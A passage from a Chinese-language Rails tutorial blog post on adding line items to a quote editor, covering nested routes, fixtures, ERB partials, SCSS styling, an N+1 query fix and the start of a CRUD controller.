<li>我们不需要<code>LineItem#index</code>，因为所有的line item都会出现在<code>Quotes#show</code>页面中。</li>
<li>我们也不需要<code>LineItem#show</code>，因为查看单个line itme没啥意义。</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># config/routes.rb</span>

Rails<span class="token punctuation">.</span>application<span class="token punctuation">.</span>routes<span class="token punctuation">.</span>draw <span class="token keyword">do</span>
  <span class="token comment"># All the previous routes</span>

  resources <span class="token symbol">:quotes</span> <span class="token keyword">do</span>
    resources <span class="token symbol">:line_item_dates</span><span class="token punctuation">,</span> <span class="token symbol">except</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token symbol">:index</span><span class="token punctuation">,</span> <span class="token symbol">:show</span><span class="token punctuation">]</span> <span class="token keyword">do</span>
      resources <span class="token symbol">:line_items</span><span class="token punctuation">,</span> <span class="token symbol">except</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token symbol">:index</span><span class="token punctuation">,</span> <span class="token symbol">:show</span><span class="token punctuation">]</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>路由就完成了，是时候加一点儿假数据了。</p>
<h2 id="Designing-line-items"><a href="#Designing-line-items" class="headerlink" title="Designing line items"></a>Designing line items</h2><p>现在<code>line item dates</code>都没有对应的<code>line items</code>数据，我们将添加一些假数据到固件(fixtures)中。</p>
<p>让我们想象一下，我们正在构建的quote编辑器是一个企业活动软件。由于事件可以跨越多个日期，我们的quote将有多个日期，而每个日期下都有多个line item！在我们的fixture文件中，我们希望添加一个房间，供客人开会和用餐。让我们在fixture文件中添加这些项目:</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># test/fixtures/line_items.yml</span>

<span class="token key atrule">room_today</span><span class="token punctuation">:</span>
  <span class="token key atrule">line_item_date</span><span class="token punctuation">:</span> today
  <span class="token key atrule">name</span><span class="token punctuation">:</span> Meeting room
  <span class="token key atrule">description</span><span class="token punctuation">:</span> A cosy meeting room for 10 people
  <span class="token key atrule">quantity</span><span class="token punctuation">:</span> <span class="token number">1</span>
  <span class="token key atrule">unit_price</span><span class="token punctuation">:</span> <span class="token number">1000</span>

<span class="token key atrule">catering_today</span><span class="token punctuation">:</span>
  <span class="token key atrule">line_item_date</span><span class="token punctuation">:</span> today
  <span class="token key atrule">name</span><span class="token punctuation">:</span> Meal tray
  <span class="token key atrule">description</span><span class="token punctuation">:</span> Our delicious meal tray
  <span class="token key atrule">quantity</span><span class="token punctuation">:</span> <span class="token number">10</span>
  <span class="token key atrule">unit_price</span><span class="token punctuation">:</span> <span class="token number">25</span>

<span class="token key atrule">room_next_week</span><span class="token punctuation">:</span>
  <span class="token key atrule">line_item_date</span><span class="token punctuation">:</span> next_week
  <span class="token key atrule">name</span><span class="token punctuation">:</span> Meeting room
  <span class="token key atrule">description</span><span class="token punctuation">:</span> A cosy meeting room for 10 people
  <span class="token key atrule">quantity</span><span class="token punctuation">:</span> <span class="token number">1</span>
  <span class="token key atrule">unit_price</span><span class="token punctuation">:</span> <span class="token number">1000</span>

<span class="token key atrule">catering_next_week</span><span class="token punctuation">:</span>
  <span class="token key atrule">line_item_date</span><span class="token punctuation">:</span> next_week
  <span class="token key atrule">name</span><span class="token punctuation">:</span> Meal tray
  <span class="token key atrule">description</span><span class="token punctuation">:</span> Our delicious meal tray
  <span class="token key atrule">quantity</span><span class="token punctuation">:</span> <span class="token number">10</span>
  <span class="token key atrule">unit_price</span><span class="token punctuation">:</span> <span class="token number">25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过<code>bin/rails db:seed</code>我们可以插入到数据库中，现在打开项目中”First quote”的<code>Quotes#show</code>页面，我们给每个Line item date添加元素在页面中：</p>
<ul>
<li>line items集合</li>
<li>新建line items的链接</li>
</ul>
<p>让我们添加到局部模板中：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_line_item_date.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag line_item_date <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
  &lt;div class="line-item-date"></span></span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item-date__header"</span></span><span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item-date__body"</span></span><span class="token operator">></span>
      <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item line-item--header"</span></span><span class="token operator">></span>
        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__name"</span></span><span class="token operator">></span>Article<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__quantity"</span></span><span class="token operator">></span>Quantity<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__price"</span></span><span class="token operator">></span>Price<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__actions"</span></span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

      <span class="token operator">&lt;</span><span class="token operator">%=</span> render line_item_date<span class="token punctuation">.</span>line_items<span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> quote<span class="token punctuation">,</span> <span class="token symbol">line_item_date</span><span class="token operator">:</span> line_item_date <span class="token string-literal"><span class="token string">%>

      &lt;div class="line-item-date__footer"></span></span>
        <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Add item"</span></span><span class="token punctuation">,</span>
                    <span class="token punctuation">[</span><span class="token symbol">:new</span><span class="token punctuation">,</span> quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">,</span> <span class="token symbol">:line_item</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                    <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--primary"</span></span> <span class="token string-literal"><span class="token string">%>
      &lt;/div></span></span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了渲染每个line item，我们现在创建一个局部模板来展示单条line item</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/_line_item.html.erb %></span>

<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__name"</span></span><span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> line_item<span class="token punctuation">.</span>name <span class="token string-literal"><span class="token string">%>
    &lt;div class="line-item__description"></span></span>
      <span class="token operator">&lt;</span><span class="token operator">%=</span> simple_format line_item<span class="token punctuation">.</span>description <span class="token string-literal"><span class="token string">%>
    &lt;/div></span></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__quantity-price"</span></span><span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> line_item<span class="token punctuation">.</span>quantity <span class="token string-literal"><span class="token string">%>
    &amp;times;
    &lt;%= number_to_currency line_item.unit_price %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__quantity"</span></span><span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> line_item<span class="token punctuation">.</span>quantity <span class="token string-literal"><span class="token string">%>
  &lt;/div></span></span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__price"</span></span><span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> number_to_currency line_item<span class="token punctuation">.</span>unit_price <span class="token string-literal"><span class="token string">%>
  &lt;/div></span></span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item__actions"</span></span><span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> button_to <span class="token string-literal"><span class="token string">"Delete"</span></span><span class="token punctuation">,</span>
                  <span class="token punctuation">[</span>quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">,</span> line_item<span class="token punctuation">]</span><span class="token punctuation">,</span>
                  <span class="token symbol">method</span><span class="token operator">:</span> <span class="token symbol">:delete</span><span class="token punctuation">,</span>
                  <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--light"</span></span> <span class="token string-literal"><span class="token string">%>
    &lt;%= link_to "Edit",
                [:edit, quote, line_item_date, line_item],
                class: "btn btn--light" %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>simple_format</code>helper在渲染那些输入到文本框的文本时很有用。例如，让我们想象一下一个用户输入下面的文本到描述信息汇总。</p>
<pre class="line-numbers language-none"><code class="language-none">- Appetizer
- Main course
- Dessert
- A glass of wine<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过<code>simple_format</code>helper将会生成下面的HTML代码</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;p&gt;
  - Appetizers
  &lt;br&gt;
  - Main course
  &lt;br&gt;
  - Dessert
  &lt;br&gt;
  - A glass of wine
&lt;&#x2F;p&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，这里很只能的加入了换行，如果不使用<code>simple_format</code>helper，则信息就只展示到一行中了。</p>
<p><code>.line-item__quantity</code>, <code>.line-item__price</code>, and <code>.line-item__quantity-price</code> CSS classes可能看起来有点儿多余，但是，只有当屏幕大小高于table And Up断点时，我们才会显示前两个CSS类，而在移动端时展示最后一个CSS类。</p>
<p>现在我们的HTML标签已经好了，让我们加点儿样式，首先，我们完善<code>.line-item-date</code>组件，这是我们在上一个章节中使用的<code>.line-item-date__body</code> and <code>.line-item-date__footer</code></p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_line_item_date.scss

.line-item-date</span> <span class="token punctuation">&#123;</span>
  <span class="token selector">// All the previous code

  &amp;__body</span> <span class="token punctuation">&#123;</span>
    <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--border-radius<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--shadow-small<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xxs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">padding-top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>

    <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
      <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__footer</span> <span class="token punctuation">&#123;</span>
    <span class="token property">border</span><span class="token punctuation">:</span> dashed 2px <span class="token function">var</span><span class="token punctuation">(</span>--color-light<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--border-radius<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xxs<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
      <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-m<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们再花点儿时间设计独立的<strong>line item</strong>，这里会写很多CSS：</p>
<ul>
<li><code>.line-item</code>基本组件用于单个line item</li>
<li><code>.line-item--header</code>用于line items集合行上面</li>
<li><code>.line-item--form</code>用于line item的创建和修改表单</li>
</ul>
<p>这样不论的是在手机端，平板上，大屏上通过<code>tabletAndUp</code>breakpoint都能正常响应，让我们写到代码里</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.line-item</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
  <span class="token property">align-items</span><span class="token punctuation">:</span> start<span class="token punctuation">;</span>
  <span class="token property">flex-wrap</span><span class="token punctuation">:</span> wrap<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-white<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token property">gap</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--border-radius<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token selector">> *</span> <span class="token punctuation">&#123;</span>
    <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__name</span> <span class="token punctuation">&#123;</span>
    <span class="token property">flex</span><span class="token punctuation">:</span> 1 1 100%<span class="token punctuation">;</span>
    <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>

    <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
      <span class="token property">flex</span><span class="token punctuation">:</span> 1 1 0<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__description</span> <span class="token punctuation">&#123;</span>
    <span class="token property">flex-basis</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
    <span class="token property">max-width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-text-muted<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">font-weight</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>
    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__quantity-price</span> <span class="token punctuation">&#123;</span>
    <span class="token property">flex</span><span class="token punctuation">:</span> 0 0 auto<span class="token punctuation">;</span>
    <span class="token property">align-self</span><span class="token punctuation">:</span> flex-end<span class="token punctuation">;</span>
    <span class="token property">justify-self</span><span class="token punctuation">:</span> flex-end<span class="token punctuation">;</span>
    <span class="token property">order</span><span class="token punctuation">:</span> 3<span class="token punctuation">;</span>

    <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>

    <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
      <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__quantity</span> <span class="token punctuation">&#123;</span>
    <span class="token property">flex</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>

    <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
      <span class="token property">display</span><span class="token punctuation">:</span> revert<span class="token punctuation">;</span>
      <span class="token property">flex</span><span class="token punctuation">:</span> 0 0 7rem<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__price</span> <span class="token punctuation">&#123;</span>
    <span class="token property">flex</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>

    <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
      <span class="token property">display</span><span class="token punctuation">:</span> revert<span class="token punctuation">;</span>
      <span class="token property">flex</span><span class="token punctuation">:</span> 0 0 9rem<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;__actions</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
    <span class="token property">gap</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">order</span><span class="token punctuation">:</span> 2<span class="token punctuation">;</span>
    <span class="token property">flex</span><span class="token punctuation">:</span> 1 1 auto<span class="token punctuation">;</span>

    <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
      <span class="token property">order</span><span class="token punctuation">:</span> revert<span class="token punctuation">;</span>
      <span class="token property">flex</span><span class="token punctuation">:</span> 0 0 10rem<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;--form</span> <span class="token punctuation">&#123;</span>
    <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--shadow-small<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token selector">.line-item__quantity,
    .line-item__price</span> <span class="token punctuation">&#123;</span>
      <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token selector">.line-item__description</span> <span class="token punctuation">&#123;</span>
      <span class="token property">order</span><span class="token punctuation">:</span> 2<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token selector">&amp;--header</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-light<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-s<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token atrule"><span class="token rule">@include</span> <span class="token function">media</span><span class="token punctuation">(</span>tabletAndUp<span class="token punctuation">)</span></span> <span class="token punctuation">&#123;</span>
      <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token selector">&amp; > *</span> <span class="token punctuation">&#123;</span>
      <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--font-size-s<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token property">font-weight</span><span class="token punctuation">:</span> bold <span class="token punctuation">;</span>
      <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 1px<span class="token punctuation">;</span>
      <span class="token property">text-transform</span><span class="token punctuation">:</span> uppercase<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-css" data-language="css"><code class="language-css">// app/assets/stylesheets/application.sass.scss

// All the previous code
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/line_item"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果你去浏览器中试试，就能看到样式啦</p>
<p>在进入下一部分前，看看我们现在遇到的性能问题，尽管算是本教程的题外话，但在这里解释一下发生了什么也很重要，当我们访问<code>Quotes#show</code>页面时，如果你去看rails的日志，你会看到一个 N+1 查看问题</p>
<pre class="line-numbers language-none"><code class="language-none">...
SELECT &quot;line_items&quot;.* FROM &quot;line_items&quot; WHERE &quot;line_items&quot;.&quot;line_item_date_id&quot; &#x3D; $1
...
SELECT &quot;line_items&quot;.* FROM &quot;line_items&quot; WHERE &quot;line_items&quot;.&quot;line_item_date_id&quot; &#x3D; $1
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的日志中，我们查询<code>line_items</code>表两次，因为我们有两条<strong>line item dates</strong>，而如果我们有n条line item dates，那我们就得查询n次了。这是因为我们每次渲染一个新的line item date时，我们都会执行一个请求去获取对应的<strong>line items</strong>,因为这行代码：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_line_item_date.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> render line_item_date<span class="token punctuation">.</span>line_items<span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> quote<span class="token punctuation">,</span> <span class="token symbol">line_item_date</span><span class="token operator">:</span> line_item_date <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>一个很好的性能经验法则是，我们应该在每个请求-响应周期中只查询一次数据库表。</strong></p>
<p>为了避免N+1查询问题，我们需要提前加载每一个line item date的line items集合，让我们在<code>QuotesController#show</code>中修改吧：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">QuotesController</span> <span class="token operator">&lt;</span> ApplicationController
  <span class="token comment"># All the previous code...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">show</span></span>
    <span class="token variable">@line_item_dates</span> <span class="token operator">=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>line_item_dates<span class="token punctuation">.</span>includes<span class="token punctuation">(</span><span class="token symbol">:line_items</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ordered
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过加上<code>includes</code>，我们会发现日志中，我们只查询了一次数据</p>
<pre class="line-numbers language-none"><code class="language-none">SELECT &quot;line_items&quot;.* FROM &quot;line_items&quot; WHERE &quot;line_items&quot;.&quot;line_item_date_id&quot; IN ($1, $2)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>性能问题已经解决了，是时候去创建<code>LineItemsController</code>了。</p>
<h2 id="Our-standard-CRUD-controller"><a href="#Our-standard-CRUD-controller" class="headerlink" title="Our standard CRUD controller"></a>Our standard CRUD controller</h2><h3 id="Creating-line-items-without-Turbo"><a href="#Creating-line-items-without-Turbo" class="headerlink" title="Creating line items without Turbo"></a>Creating line items without Turbo</h3><p>现在数据库，模型，路由，标签，样式都好了，是时候开始Controller了，和介绍中的一样，我们先不用<strong>Turbo Frames and Turbo Streams</strong>，我们将在后面优化</p>
<p>我们的Controller使用除<code>#index and #show</code>以外的actions，我们先来写<code>#new and #create</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/line_items_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">LineItemsController</span> <span class="token operator">&lt;</span> ApplicationController
  before_action <span class="token symbol">:set_quote</span>
  before_action <span class="token symbol">:set_line_item_date</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">new</span></span>
    <span class="token variable">@line_item</span> <span class="token operator">=</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>line_items<span class="token punctuation">.</span>build
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
    <span class="token variable">@line_item</span> <span class="token operator">=</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>line_items<span class="token punctuation">.</span>build<span class="token punctuation">(</span>line_item_params<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token variable">@line_item</span><span class="token punctuation">.</span>save
